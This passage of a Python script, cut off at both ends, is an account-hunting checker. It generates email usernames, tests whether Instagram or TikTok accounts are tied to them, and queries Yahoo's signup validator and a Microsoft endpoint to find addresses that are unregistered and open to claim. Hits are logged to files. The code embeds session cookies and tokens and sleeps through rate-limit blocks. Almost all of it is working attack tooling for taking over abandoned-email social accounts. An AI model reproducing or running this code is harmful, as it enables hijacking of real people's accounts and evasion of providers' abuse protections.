							'A3': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
						  'A1': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
						  'A1S': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc&j=WORLD',
						  'AS': 'v=1&s=0sHA17fo&d=A62cb7327|5xRp8pr.2UJmOAqR8uAJglbFObbsH8uOznbuKM00ySlD8Ha.X4jNUXo4VEjGrKs97pN8kPAqzIf1jQcTQp5veb991hp7CXQa18n8eMvtp0i3TKdzY_snYqc41YJj1lVf5YXbOhZFbUgbZ2.BI5VJuQoxc9BfU6gFuHcokkx86DndLRGqMpFyzmFeAViTx6LSbPs2soSDVxJyEtCeBln32VP6QDigRPlUzpL8mrluwSF4NXjjJg3kpS308GYePy96Pznh3CvVja7A0RUIQanRzwQWoKX7u3c5Kgak5jZEasYEQHnqWNCzZXZn5j7BKRKruJ3nhcjBB0BD7YCmViG7NYR1QnbCOntbcWVTvhgr3v7fYIg5cx93ChX3TrMiqfnj.h35U2rNdLWlilATg3BEysTnYSjSIsKcQYnA4C9vzP8Db7tHidwbS1cCjttg.aOyemeymvsE2Y_FsfkK4Qeqx6b0cwqrM7IqzCp0vQp5I_87QmIk8boy4dYeyswIGcdnkLJb45mKMh3DsI5vMN7xyTRhJYO7JVMisaK0Zw8EyrG8z8hCgnozUBv3LpyJjxqbGQGcNBkvn7lhWZgLvsNoBUgVaTEYw5UC0aG7QCh2U7KF9qvv9O0CMZor7aubtx3Z.7SKZVAo7f1yPc4huhhlghkzbNn4BQBL0Fx0dEjQ3Df54gjiOVp5AcJlGM9qlkjbIMDQlg2n_LDedAwQgRoyvPxyrP.Tvqua0OFVi_LUaamtbNsS1SgmJTKobw2K3R39VKy9gcA0vieC9MvgkXQI._E_vz1BtEav0E6RsD2cD.k9j0Jw2brizvfy1wfr6vWoC1bqTMwiEzNGjsX0ug9Yf.yzteWwiWeIAbBG5aSyw9r4O_D9AIig62YIj6y5ERN1msWLRSFv3Dj.ExQ2ek7xuSeN7qW5EIh.4Pnvbm1WNv1TXVuw23WA7HV7WtEiOkfFDs5DvjhLX4MIU_Bt.gpZAcg89Yg-~A|B62cb779f|5f1yTBf.2Tq2W7LQ3KsSFbticESMze16y.0N0bOBd_EFQ_q1.moN9y.T_Vf0mwzJRub.9SzesA7Pzge4dwE_n84Jwg31ipQlUd7uIpky29J0EB2spihP_9ukbwI3MhWdMnds18q42N5ajt9kgn10vdAx5Fp9sNFAbXVl0op1I9bNGrfuz_4_P.a8Eoak702B2ebotX0YdNYct.IJ66Qfd8D.3g1ymlmnHxr7Y2IwJYCg15oQyQBeF8Z7DNW8_kZrP1s6dSZpd75ZI6wro_Rwh2ubvUely.oxpRFUTM2Vlh_VxnvDBDkBPaUC6OO0POVyPIbbCYKUWCVKcMQ_iVYhT.Nh0hntrcppxtz4BVp0rB6jAeb8nc0CrwSFRXP4uo8ICcsK22LsRqH7GWqqpQgrgZC51xJoFGph.Z4ZIX8fMu80u4Eh7lVx4emSGoO3UfrvvkL1RFWxHBfnSxeTmc3dYdPIpJj18qWQShVerqs1UcsB7Hxh67QTx1d2VqqKH9y044pHa55bjeSRnOkIYdHYv2us5rQSEw_04BBRBPAgbSnWrl9COJvpVTVeMF6ykV1.TJzQCKltU4uRTKiQIKfy9vGJuiKjwjFc7h1V5S9Y8Jd69EaDEb1XCaeOAruPYJqc9MINCeycUQFqhxUoHKUORcK9RV_9EINbPwgiB290jhdk3mEffmVI8a8RCcIpiW5dwUCgMkrBb90ebetwP_I9I5fke_USUYS3KtIsOq7L8APsJ4lCmwOdfAPm9OWyLz20bOdk0CidwpDFrqqxQt2JfUe_oyJB8FdZRfmcGmvjrnZm6blzGzUbFnxxJ.5ydhPjmf345BXcxnS3E.U0emkN4Wc0V.xzM_hkQh.oCeqWzSqf15eHZRSoLUusEUA.31Md9l67W_lNcQ.6nASTIWxr_q0l8jjGSGyiyJY-~A',
				}
				      	
				      	
							data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMem ory%22%3A4%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A420%2C%22timezone%22%3A%22America%2FLos_Angeles%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%203000%20Direct3D9Ex%20vs_3_0%20ps_3_0%2C%20igdumd64.dll)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1657415199200%2C%22render%22%3A1657415200314%7D%7D&specId=yidregsimplified&cacheStored=&crumb=V0Pr4B6tQHi&acrumb=0sHA17fo&done=https%3A%2F%2Fwww.yahoo.com&googleIdToken=&authCode=&attrSetIndex=0&specData=3qiYX%2FHBcI%2F%2BhrvMxYBXgXQb1%2FYAeMSHZmV4MqgmhqN1URqj%2FsjgTGrzl4FYAaAL1UczLgsaT4rm7Cq3BXusOpCF83nfWay%2BC4rhWCth8rBob6OT8S9v0s7KQfuZoeXmPP0NCJxRHjiKlQBmUepkdKTRtym7LERXeBITKc8qTL15f6Vb9O1yc3ZBETBW%2FOpt6%2FNdXvTgPh8z9rX4CcDlWyjVuO2KusJUgIe2sQ%2BSs7EOIYSCVcNUAOqCtXAFkLyS%2FwtNW9ew2r%2BdkiOEmXXi2Akg3YFs3tNskYHR8cTvqHvpf9mEeGwYDCg0%2FGzQybLfG9um3opaS%2Bvnkz19nTE2jfxnlgudhbhKSkg5b4I3WA7tiQh%2BfdpkINdYrPRYXa%2FbQO47iWX9XnSJm536xRWWqrirGNYme3ZP%2FkbEHdsOCRN59fCXf9GEj0GSdIOYs2OI%2FgcOEl%2BQAV3uH0Dg8OZC0Cm9Nrk%2FYJTIntesxVHvpI5qGAYMr8sR47yrUHuZCahwj9T8tJob%2BJh7cKO1rw83V07K4zwiBSzeQyxbKKj%2BoaUK6tDYVCsS0nsPl9YYzNakW4V6hLVHiMlIwrqdSaaqyD%2FpkWwIZon33c6ulzzRogLES4lZi%2B6Y1I34QbnRs1M1%2Blag9xNYAhe2ysOQWsbec5F2vJaYY941UzlAEH5Z2aoCAgUchjmfRvAqwD3J%2FKlAmwATVMjlgwYwiGZb%2Bc6XIyzGV0P4iq%2F0h8mvJaBqloH%2Be8G%2BOApb2ybaGWor1R1RCt5oHPvbi5pcXhv895j3Pf8R%2BzuCxZu%2F2fLWCugzT4auXfUEvQoR9cBsQxKBe%2Fiw6eo78VzExH9qBh2kpEqtjy1LkHzoh24mn%2FTykqvPMu6cOtu0ZNv%2BCQVEXhER%2BLiZmHqtkvc75fUK1ELu4lKpMitRu4%2BnYTf7saiWOVdn2gQgI2p%2FXU7iPBSxwEzabRpoVwb5wUymGZFsloAcLmBz0FuWtkoqfHzmJdQSZY1y%2BJqMKP30vK8Zy9%2F8RVMpvb859VdesnhF%2B%2B1lFWkfCal3tQNR%2FnN%2BScD4A9rDs1alXxvEpGjnXSpCQ569imLxX11pbaozUXipv4%2BG2WrhGGuTulBoeucBhkiTNf3r73WJfwRCCJCEyztLcYbl3x9P6ahKOjGKEdVDnVi4vGIi47A56jVoQn3QoHmahw6PsqlV4dhtd0u%2BYQ0s09rmFGABQjPdQaSddrB0g32WVOBdruFLeevg9bKRkZYOcr1AfWsuIqi6HaDiKCgomeNN0xB77B0lrwLyS6bW5iGTPP6a%2BlokF6YJKoIlh%2B3xVDWZ4%2Bjj3iEViHGJJA4hsLGy%2FN88eRNZ2RVo957EK3%2FE6vu0L4phnMCwMRxx7PVY2d3oHdGfyMpYFnHK1HRhWspF6PbLoz1jewpUPtuUXmA8qtphATgd4GpwugPQJq6L6n1RFRnHd8WrazHf1HxSO1cZObRYDFPwwR1TK4RkS%2FCoHMePTwNFgy85Z%2FDZ3QYKGhQ8himvoLFH9yLpERLhvS7n%2BV%2BXBJhEOUEDqrTgzf87BX2qI5pKB8P1SZelaAgUU3cXMqxo3et1yxlXaeOptj3K6QrZHs%2BjfTWp5rSVCQ7lj%2BFVql1JChhIU7t0E6h0Y73%2Fy%2BSfnUUtLrjySQQD1vHE%2F6eZYQUHUnz7bYj88EVQZ4e8LAYJvh62gYgoHNIHnk%2Bsa18Q3OUVhcCRqaO4XIiUCWXWaMa8TC7OWOicicC7C73mfEapdQoRpacErL5cDj0lVU%2FkSO31BukbIJ3qXArWnB6xHoBG2L%2FJnwURub4U0e65qB3cAnFe1z%2Bu9SIYRQtmEX%2B%2Fb91mI%2F06XMQd3YrYv%2Bod2sTCVHbpiUXe6vR%2FG5edhHiGB53aMuHX1ljEB711okyoJOViTHu1Fuf4pLhvDSZyOeHBqqX5qj%2FsNjoyZGI1o04O%2F2u%2Bo%2BJMy5YvVVRd8ALRgcpOkqdG9KuT00t1b7R5J5TKKxwUbqMKnkUHGbHi3hA9rHD6Kqn7nfFNvzLmFvA7aN4mFbGy8SncJ9O6MBofHhFnPkhC%2FZdxkYtjDAtSRE9AVNvxEbbGHhqhKBJFaDn%2F2zbK1OqAyC1Wy7rjD7bzYZT3RFKprvz4Dp1SZO732C6%2BcEStFzKt1hK%2FzXDidbZz6bgRhasGBzT2m5ty1F8Y9VCUeIcDbhzkcsztEsqjTbgF1VHJvuxAPo14nDI%2FCHcGCOX7aHSXH4U7G0YFH7O09NruPxcR40KCfO%2FF8eQ%2Bd4ovBGb1SW%2F4wcJ9pWzPKS4XUQ5xSlitdekid5nyDTSEIODfW2vLufF9Da%2BFuj87kH0TtBcM0SR7d5XfYAMA1OOmzOt35LCJGFgF%2F3xyLZv1ghZT%2Bx28qC8fZ7V%2FVnH3uYrVM1S%2FIN71UZRS%2FUK6Cq9bVLrRfGSRqAYlpSalBB8squ%2BsGQ%2FrhLtu6J29Ttg0N1wHovjPX9kPgqsVCcYTIrUE0PcZDw%2BGd5EUiyBNF6HZ4oAMafvj5snS9gLIhIcG82aEhwIfiBR9Rwm%2F%2F7hGq5REIesblFcPIszNvXHr8Prb4xetLLmTYlLxHa9FhoiUG3HxbTJFxSPdc03x9h0665awOppQ4YxAQHjcxOrrzjxhrcZH2TL7DAJZS7F%2FpQae11m00SYVMbufIUT5rCqGf1Kc1zLEbVbEksEgsJ3I3xsjexEUPD9tuDOA5KzqfKBGG3jNbuSrfVcVgk6s9bsGRifmYPbk5ahcXu3c7ekuPG72VDVSaS9kpIFMyVDzQV%2F%2BFdK1vIC48pyZXyVNStS6KxQbKj8CkexdqxJwlV1JpRL8sFYb6o0L%2FMJNL%2B2GMVToSJXCqiM0BaBfvBIae2dIhs2tvZlui7IIUdUAQkwAMjjL9LN%2BvIgdoVtCupTMD3TUqTDfU1Cg0C3K98xi5mfeGP6JJwoSlztXIGDuM4EL%2FnSthWs9gniCkxA36e%2F6zW%2FioH0BKVMFanLjjBRUbaKSdVxtQiJYZ6wiYGJhm%2BTGCPMQG2JLlDj4bJeiNCe8wFzDEDUSL8Q65FLSCcZc9UQBxzSSpeIzCSFT4sY%2Fy61Nr%2BgPgBC36PGOx7M0rPPeeU1ePluevsUiXMhcAl7eayJnr5tG1iqRa%2FFSf5jhEaWM7eC10Ey7iAiNDvtxzoSFRqjnEAADD%2FPzhUmcBJdowhE4Y4YBRB81pIgWFgbuhD31Cnfl93n1UBSPEdvR%2B9acYSeFhLoJFkYIjDzwxi9sjp8ik9wUwk70ff9aJRrkfQRWDliWDaJA2um0X%2FYxazTvk6UYJ9du01kePKT%2BUs8fpulOJhEUi2U02ZyqVwpgeoQmdGrztvt9v7U5vICRNpXm3sdcx8bfkvFMRGsUoxPM%2Fxnla9yal2ZtkWPOltctM%2FmdkJtlBvHjffRBOV9CRHP0b7fIZAGFFh2qQbvkRrf53cQQG3OIM5d5AdtiC7769vQ1uKtciUcAmngVpQfMqXBdSgSA5xG1nKfxyZO9oTGIGlf5xJ9lCdoQdLuyJlR6ma5ro29HzqO%2FelrWrajXYFRMqb0jfbMTZiV0hyZpb8Whu6r5KEQ4i2iyZXrMu%2FKXN1LntbdD8%2BHRBQITCt3hvqkk0D%2BU8e1LGceaHsUyVOKx3KN%2FeH3iUAYX4LhP7QKylegSCMX8ujZMyQarDnJmUhdtdVTpqZuskfC3U%2BFuqcV1ueLwy7i7nwlnJR916wpBEKzJxuu5W4XY1xl295AAkrqQ1w3dQD3Y1RmzbHptQooybc87d4P%2BP48djTkXjk5%2BtzQza31zuVMYeXCEOveFDLjhCWJ%2FEfVo4om0PcaQMJ8rIJcwRPbBCHJHPny%2Bp5IjImeGDscr7NZfj6Rxs9a7BzbRv6sSZitlQrzasw8T5XHIglPVLX9qT1uvUhey%2FETHBTZS%2Fy4CyfIwCBgi7TV4L%2FY0D49DyWNvf9TUP4f%2FxP7fPw0MbUkf16e8fzUE2tkvkeeoYzyXkU5Oe9JSS6c2Jfwo%2FFRTB5K75JNwdog8sebO1NyXRVjJlaoS4SgnVJk5Aix2NUPMcIJU5MmYji0gKu1A6QSODbRtXhmvyd8b1FwRv1MWCSmUHfbkZYxLE6GDO24gaYyrwp0h7ahYC55bti4QrVpPDCcGEj7cUBtzUcLMT2MJOXsfjsAbRsRxBW%2BeMOpMhdnEDTFkNIbUPsmzzrMaUu7Y%2BUAfap639tZUe%2FbNqgibgye2KhlXPS%2FTGtxUGsDZqVBCW03N%2FWahUWhtLKp7KJnutk9otzkZ07VHReV1x3fblTYgS59RSPXwUGY97wQCpSbCFpL7xISbzM0SoAegHDQYy09MtD1vfhfDeEZHyR%2FFCt0YLWvIRVoA8A2K5xWUMmPrd657A2gGKeT0%2FthL%2FZpHTSOLLd5RA9VTKXNVu3xE%2FF0OKQ1HTp4p35M4FJV6eheJOiPgcU1BMuZKMXCXf7x0bpCevEXIeSYaD8pQJHLPXyCj%2BpWzjzNdBhOjbtSdloonEyHvrm19UB10QxDR%2B2fMLKJIDKQJtgYFjQhXGUxGpEmPTQ0uekJZ48ej2Gji1tqWlseMOMipg0S1Rgta7MWQQ3EL88J7u9PJf9soLTOaf7Pqqs%2BobulcEsjxv9aPwILr15ZMfdspWg%2Btx8%2BN5b%2B0uYMSwh%2FOdeMCHS8DONFUKN%2BI8ln3tV0kFaqPNNdHTbwJzbPv1a0Y7v%2FCaqPOoAqXPwpUxmI%2FzgQtCgJ91Raj%2F%2BPNzxDn6JxE7nUIo1X%2BjUwerAkQ2Dygy8Fho%2Bw1BYfihj03CZhjS1krj8Vd04aQabeKSZVzdjfCdpkfzwFHfi77iq6vKPHsQmsZadPFf6aXVazYE6SrXj4RRbaoBsW%2BtJ9PGpu3En9CgvKk9JrArFBq4qRM56H2C%2FwIoUQxYEFQgxiB9RYZMF1ZHmTluTqYOak6GO%2Fw7D%2FZjhBWtnBlpTbMafcrExzCy0YuUklTs5v3gQ6uMdvpWo60FlSd4TBhgRu%2BoyOMzxC2U7swA8JqWlfnvrlX0NmrSYKNHzloPAfpXINg7IR4%2BP2vdHHyEu%2FdymeKI4b3cS8fEDC%2BIr4D%2BfXa1edNyqPdFIFmvKGZeVRDuIXNXM%2BjZLLAD7R8Pw%2FRXC5X%2FgGXX01HU4Ma7vPcIcoUY0HpYRohxZHbuvlCxlbj6MMteOXJJPtgiN7z%2BjC6eyognmaE%2BWWeg4uemCw8mw0Ld2mKorywvWbu4DvOBaXuivqtDfkH5b%2BQstz493hTZ5ovVuAssLygF6US%2FFabYr3KxoyEjmhYpvsA45wctYfcjmFwdf1QT2wQz%2FOoskWn1fCsGKCU6OCb%2BHBCQa5KCSN5y%2FNpOWXUIyB3Z5jQXrs3%2F%2BcWGRkm6fDXJHiASkDuhaJuhg%2BHXaFPTGouoi%2BDpseLIE6QDjIhgVsm2WKIlTJfAekOEQMW8IPzFjABJrdWgZg08BqHIwFTSoMgz6DCT3xP%2BpCZE9xkzXCsPKgtvjqAyVrc8rQWvC2XznQYahjmw%2FTPz10lDVAlH41I8XP132BqPUv5jy3tmjQTFeIkbfH%2BQoe2HN4rHa07AwLHP6Y0gDQqIkbY4lPUoHNPeS6jVXnb6d%2FGFRl8tTKg4QCEaZX3lwzjjXXVAlmz%2BZ0wc1jGXRclTPTNnR%2BvklAjqPIypAz%2BR9tx4rLe5jHLXuCy0LHuIdb5OLrCF%2Fgr1MCywGJHpNao4oeukqk6OPPtFN8eYplJy8tnNwoJSsoNrXR1iNFIt%2F3VZRtgOQvrGQ7x0AXwvVqX6Vt%2BYzQ3WWQdu%2BBI9CsFPE7IX4Ek1ZJ97r1%2BREvommgXkRii4pYbZPEGbkgVMcI42x94LtVEM2ZXqsJyAaQY9rX7bsSAahgp3udxAGzoa%2FjTs6tW1oD6sBin1kcjElZbkBI80DCV2rka9LDImH9ZM7NDDU6leamdb2oJCAmB1YMXozgIV5kpMgbVr1%2BdAPuJX3lKyk9kWI9VrBCtmMo%3D%7CjUP9j77GikcMDQ84gY3nfg%3D%3D%7CIM7sEaFvNp%2BZ6Fsp6b915A%3D%3D&tos0=oath_freereg%7Cxa%7Cen-JO&firstName=&lastName=&userid-domain=yahoo&userId={EMAIL}&password=&birthYear=&signup='
							p = {'validateField': 'userId',}
							response = requests.post('https://login.yahoo.com/account/module/create', params=p,cookies=cook,headers=headers, data=data).text
							if 'userId' in response:
								done+=1
								print('\n\n')
								print(White+' - - - - - - - - - - - - - - - - ')
								print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
								print(f'\n {White}Instagram  {Green}[✓] {White}||{White} Email {Green}[✓]')
													
								print(White+' - - - - - - - - - - - - - - - - ')
								print('\n\n')
								open('done_ig.txt','a+').write(str(EMAIL)+'\n')
							else:
								bad+=1
								print(White+' - - - - - - - - - - - - - - - - ')
								print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
								print(f'\n {White}Instagram  {Red}[x] {White}||{White} Email {Green}[✓]')
								print(White+' - - - - - - - - - - - - - - - - ')
								print('\n\n')
						if 'spam' in re:
							block+=1
							print(White+' - - - - - - - - - - - - - - - - ')
							print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
							print(f'\n {White}Instagram  {Red}[x] {White}||{White} Email {Red}[x]')
							print(White+' - - - - - - - - - - - - - - - - ')
							print('\n\n')
						else:
							bad+=1
							print('\n\n')
							print(White+' - - - - - - - - - - - - - - - - ')
							print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
							print(f'\n {White}Instagram  {Red}[x] {White}||{White} Email {Green}[✓]')
							print(White+' - - - - - - - - - - - - - - - - ')
							print('\n\n')
					
							
					if '@hotmail.com' in Domen:
						EMAIL=use+'@hotmail.com'
						re = r.post(url, headers=headers,cookies=cookies, data=data)
						if re.json()['status']=='ok':
							url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + EMAIL + "&_=1604288577990"
							data = ''
							headers = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
	    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
	    "Connection": "close",
	    "Host": "odc.officeapps.live.com",
	    "Accept-Encoding": "gzip, deflate",
	    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
	    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
	    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
	    "uaid": "d06e1498e7ed4def9078bd46883f187b",
	    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
							html = requests.get(url, data=data, headers=headers).text
							if 'Neither' in html:
								done+=1
								open('done_ig.txt','a+').write(str(EMAIL)+'\n')
								print(White+' - - - - - - - - - - - - - - - - ')
								print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
								print(f'\n {White}Instagram  {Green}[✓]{White} ||{White} Email {Green}[✓]')
								print(EMAIL)
								print(White+' - - - - - - - - - - - - - - - - ')
							else:
								bad+=1
								print(White+' - - - - - - - - - - - - - - - - ')
								print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
								print(f'\n {White}Instagram  {Green}[✓]{White} ||{White} Email {Red}[x]')
								
								print(White+' - - - - - - - - - - - - - - - - ')
							
						elif 'spam' in re.text:
							block+=1
							print('\n\n')
							print(White+' - - - - - - - - - - - - - - - - ')
							print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
							print(f'\n {White}Instagram  {Red}[x] {White}||{White} Email {Red}[x]')
									
							print(White+' - - - - - - - - - - - - - - - - ')
							print('\n\n')
							for i in range(1800):
								time = 1800-i
								sleep(1)
								print(f'\r {White} Seconds [{time}]',end='')
						elif  re.json()['status']=='fail': 
							print('\n\n')
							print(White+' - - - - - - - - - - - - - - - - ')
							bad+=1
							print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
							print(f'\n {White}Instagram  {Green}[✓] {White}||{White} Email {Green}[✓]')
									
							print(White+' - - - - - - - - - - - - - - - - ')
							print('\n\n')			
				
				
				
				
				
				
				
				
					if '@outlook.com' in Domen:
						EMAIL=use+'@outlook.com'
						re = r.post(url, headers=headers,cookies=cookies, data=data)
						if re.json()['status']=='ok':
							url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + EMAIL + "&_=1604288577990"
							data = ''
							headers = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
	    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
	    "Connection": "close",
	    "Host": "odc.officeapps.live.com",
	    "Accept-Encoding": "gzip, deflate",
	    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
	    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
	    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
	    "uaid": "d06e1498e7ed4def9078bd46883f187b",
	    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
							html = requests.get(url, data=data, headers=headers).text
							if 'Neither' in html:
								done+=1
								open('done_ig.txt','a+').write(str(EMAIL)+'\n')
								print('\n\n')
								print(White+' - - - - - - - - - - - - - - - - ')
								print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
								print(f'\n {White}Instagram  {Green}[✓] {White}||{White} Email {Green}[✓]')
								print(EMAIL)
								print(White+' - - - - - - - - - - - - - - - - ')
								print('\n\n')
							else:
								bad+=1
								print(White+' - - - - - - - - - - - - - - - - ')
								print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
								print(f'\n {White}Instagram  {Green}[✓] {White}||{White} Email {Red}[x]')
								
								print(White+' - - - - - - - - - - - - - - - - ')
							
						elif 'spam' in re.text:
							block+=1
							print('\n\n')
							print(White+' - - - - - - - - - - - - - - - - ')
							print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
							print(f'\n {White}Instagram  {Red}[x]{White} ||{White} Email {Red}[x]')
									
							print(White+' - - - - - - - - - - - - - - - - ')
							print('\n\n')
							for i in range(1800):
								time = 1800-i
								sleep(1)
								print(f'\r {White} Seconds [{time}]',end='')
						elif  re.json()['status']=='fail':
							bad+=1
							print('\n\n')
							print(White+' - - - - - - - - - - - - - - - - ')
							print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
							print(f'\n {White}Instagram  {Red}[x]{White} ||{White} Email {Green}[✓]')
									
							print(White+' - - - - - - - - - - - - - - - - ')
							print('\n\n')						
					else:
						print('\n\n')
						dome+=1
						print(White+' - - - - - - - - - - - - - - - - ')
						print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]{White} \n Domen not found [{dome}] ')
						print(White+' - - - - - - - - - - - - - - - - ')
						print('\n\n')
				except  :
						block+=1
						print('\n\n')
						print(White+' - - - - - - - - - - - - - - - - ')
						print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
						print(f'\n {White}Instagram  {Red}[x] {White}||{White} Email {Red}[x]')
								
						print(White+' - - - - - - - - - - - - - - - - ')
						print('\n\n')
						for i in range(1800):
							time = 1800-i
							sleep(1)
							print(f'\r {White} Seconds [{time}]',end='')
if choose == 1:
	
	print(f'''
==============================

{BYellow}[{BWhite}1{BYellow}]{BWhite} - GMAIM    {BYellow}[{BWhite}2{BYellow}]{BWhite} - YAHOO
{BYellow}[{BWhite}3{BYellow}]{BWhite} - HOTMAIL  {BYellow}[{BWhite}4{BYellow}]{BWhite} - OUTLOOK
		{BWhite}
==============================
	''')
	domen_num=int(input(f'{BWhite}[{BYellow}+{BWhite}] - Choose : '))
	lingth=int(input(f'{BWhite}[{BYellow}+{BWhite}] - Lingth the email : '))
	while True:
		email=str("".join(random.choice(list)for i in range(lingth)))
		
		if domen_num == 1:
			domen='@gmail.com'
		elif  domen_num == 2:
			domen='@yahoo.com'
		elif  domen_num == 3:
			domen='@hotmail.com'
		elif  domen_num == 4:
			domen='@outlook.com'
		EMAIL=email+domen
		
		o=tiktok(EMAIL,domen)
		sleep(6)
		print('\n\n')
		if o == 'block':
			print(' YOUR BLOCKED')
			block+=1
			for i in range(1800):
				time = 1800-i
				sleep(1)
				print(f'\r {White} Seconds [{time}]',end='')
		if o == 'bad':
			bad+=1
			print(White+' - - - - - - - - - - - - - - - - ')
			print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
			print(f'\n {White}Tiktok  {Red}[x]{White} ||{White} Email {Red}[x]')
			print(White+' - - - - - - - - - - - - - - - - ')
		if o == 'done':
			done+=1
			print(White+' - - - - - - - - - - - - - - - - ')
			print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
			print(f'\n {White}Tiktok  {Green}[✓] {White}||{White} Email {Green}[✓]')
			print(EMAIL)
			print(White+' - - - - - - - - - - - - - - - - ')
			open('done_tiktok.txt','a+').write(str(EMAIL)+'\n')
			sleep(3)
		if o == 'email_good':
			bad+=1
			print(White+' - - - - - - - - - - - - - - - - ')
			print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
			print(f'\n {White}Tiktok  {Red}[x]{White} ||{White} Email {Green}[✓]')
			print(White+' - - - - - - - - - - - - - - - - ')
		
if choose == 4:
	
	print(f'''
==============================

{BYellow}[{BWhite}1{BYellow}]{BWhite} - GMAIM    {BYellow}[{BWhite}2{BYellow}]{BWhite} - YAHOO
